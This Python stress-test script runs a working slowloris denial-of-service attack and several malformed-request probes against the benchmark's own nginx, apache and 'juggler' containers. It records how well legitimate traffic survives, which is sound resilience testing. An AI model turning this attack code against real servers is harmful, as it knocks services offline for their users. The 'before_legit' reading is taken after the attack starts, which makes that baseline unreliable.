#!/usr/bin/env python3
"""DDoS phase 3+4: slowloris and protocol abuse on the bench matrix.

Phase 3 (slowloris): a hand-rolled attacker opens N sockets and drips one
header byte-chunk every 4s, never finishing the request. While the attack
holds, a legit wrk load runs against the same server; we record legit RPS
drop, errors, and whether the server survives. Servers: juggler (rate
limiter ENABLED via admin knob, restored off after), nginx, apache.

Phase 4 (protocol abuse): one-shot probes — 64 KB header, 8 MB body,
garbage bytes, pipeline flood — checking response correctness/survival.
"""
import json
import socket
import subprocess
import sys
import threading
import time
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

SLEEP_HEADER = 4.0
ATTACK_CONNS = 500
ADMIN = "http://127.0.0.1:19090"
ADMIN_HDRS = {"Content-Type": "application/json", "Authorization": "Bearer bench"}


def admin_settings(payload: dict) -> None:
    req = urllib.request.Request(f"{ADMIN}/api/settings",
                                 data=json.dumps(payload).encode(),
                                 headers=ADMIN_HDRS, method="POST")
    urllib.request.urlopen(req, timeout=10).read()


def sh(cmd: str, timeout: int = 120) -> str:
    return subprocess.run(["docker", "exec", "bench-wrk", "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout).stdout


def legit_load(target: str, secs: int = 15) -> dict:
    import re
    out = sh(f"wrk -t2 -c100 -d{secs}s --timeout 10s {target}")
    m = re.search(r"Requests/sec:\s+([0-9.]+)", out)
    e = re.search(r"Non-2xx or 3xx responses: (\d+)", out)
    return {"rps": float(m.group(1)) if m else 0.0, "non2xx": int(e.group(1)) if e else 0}


class Slowloris(threading.Thread):
    def __init__(self, host: str, port: int, conns: int = ATTACK_CONNS):
        super().__init__(daemon=True)
        self.host, self.port, self.conns = host, port, conns
        self.sockets: list[socket.socket] = []
        self.stop = threading.Event()

    def _new_conn(self):
        s = socket.create_connection((self.host, self.port), timeout=10)
        s.sendall(b"GET /bench?slowloris=1 HTTP/1.1\r\nHost: target\r\n")
        return s

    def run(self):
        while not self.stop.is_set():
            # top the pool back up (slowloris classic: keep 500 half-open)
            for i in range(self.conns):
                if self.stop.is_set():
                    break
                if i >= len(self.sockets):
                    try:
                        self.sockets.append(self._new_conn())
                    except OSError:
                        time.sleep(0.05)
            # drip one more header on every live socket
            for s in list(self.sockets):
                try:
                    s.sendall(b"X-a: b\r\n")
                except OSError:
                    try:
                        self.sockets.remove(s)
                    except ValueError:
                        pass
            self.stop.wait(SLEEP_HEADER)

    def halt(self):
        self.stop.set()
        for s in self.sockets:
            try:
                s.close()
            except OSError:
                pass


def slowloris_round(name: str, host: str, port: int, target: str,
                    limiter_on: bool = False) -> dict:
    result = {"conns": ATTACK_CONNS, "limiter": limiter_on}
    if limiter_on:
        admin_settings({"rate_limit_tokens": 200, "rate_limit_refill": 100})
        result["limiter_apply"] = "ok"
    else:
        # The previous limited round's bucket must not leak into the open
        # round: the retune fix makes admin limits bind live buckets now.
        admin_settings({"rate_limit_tokens": 1_000_000, "rate_limit_refill": 1_000_000})
        result["limiter_apply"] = "restored-open"

    attack = Slowloris(host, port)
    attack.start()
    time.sleep(8)  # let the pool of half-open sockets build up
    result["before_legit"] = legit_load(target)
    result["during_legit"] = legit_load(target)
    attack.halt()
    time.sleep(4)
    # recovery: server answers right after sockets release?
    result["recovery"] = legit_load(target, secs=5)
    return result


def main() -> None:
    results = {"slowloris": {}, "protocol_abuse": {}}

    print("--- slowloris juggler (limiter ON: 200 tokens/100 refill)", flush=True)
    results["slowloris"]["juggler_limited"] = slowloris_round(
        "juggler", "juggler", 8080, "http://juggler:8080/bench", limiter_on=True)
    print("   ", results["slowloris"]["juggler_limited"], flush=True)

    print("--- slowloris juggler (limiter OFF = stock bench config)", flush=True)
    results["slowloris"]["juggler_open"] = slowloris_round(
        "juggler", "juggler", 8080, "http://juggler:8080/bench")
    print("   ", results["slowloris"]["juggler_open"], flush=True)

    print("--- slowloris nginx", flush=True)
    results["slowloris"]["nginx"] = slowloris_round("nginx", "nginx", 8081, "http://nginx:8081/bench")
    print("   ", results["slowloris"]["nginx"], flush=True)

    print("--- slowloris apache", flush=True)
    results["slowloris"]["apache"] = slowloris_round("apache", "apache", 8082, "http://apache:8082/bench")
    print("   ", results["slowloris"]["apache"], flush=True)

    print("--- protocol abuse probes on juggler", flush=True)
    probes = {}
    # 1. huge header block (64 KB)
    out = sh("python3 -c \"import socket;s=socket.create_connection(('juggler',8080),timeout=15);"
             "s.sendall(b'GET /bench HTTP/1.1\\\\r\\\\nHost: x\\\\r\\\\n'+b'X-Big: '+b'A'*65536+b'\\\\r\\\\n\\\\r\\\\n');"
             "print(s.recv(200).decode(errors='replace').split('\\\\r\\\\n')[0])\"", timeout=40)
    probes["header_64k"] = out.strip()
    # 2. oversized body (8 MB POST) — server limit check
    out = sh("python3 -c \"import socket;s=socket.create_connection(('juggler',8080),timeout=20);"
             "h=b'POST /bench HTTP/1.1\\\\r\\\\nHost: x\\\\r\\\\nContent-Length: 8388608\\\\r\\\\n\\\\r\\\\n';"
             "s.sendall(h+b'x'*8388608);print(s.recv(200).decode(errors='replace').split('\\\\r\\\\n')[0])\"", timeout=60)
    probes["body_8mb"] = out.strip()
    # 3. garbage flood
    out = sh("python3 -c \"import socket;s=socket.create_connection(('juggler',8080),timeout=10);"
             "s.sendall(bytes(range(256))*40);print(repr(s.recv(120)))\"", timeout=30)
    probes["garbage"] = out.strip()[:120]
    # 4. pipeline burst (50 requests at once)
    out = sh("python3 -c \"import socket;s=socket.create_connection(('juggler',8080),timeout=10);"
             "s.sendall(b'GET /bench HTTP/1.1\\\\r\\\\nHost: x\\\\r\\\\n'*50);"
             "import time;time.sleep(2);d=s.recv(65536);"
             "print('responses_got:',d.count(b'HTTP/1.1'))\"", timeout=30)
    probes["pipeline_50"] = out.strip()
    results["protocol_abuse"] = probes
    print("   ", probes, flush=True)

    admin_settings({"rate_limit_tokens": 1000000, "rate_limit_refill": 1000000})
    print("limiter restored to open bench config", flush=True)

    with open("bench/results_ddos_ph34.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=1)
    print("written bench/results_ddos_ph34.json", flush=True)


if __name__ == "__main__":
    main()
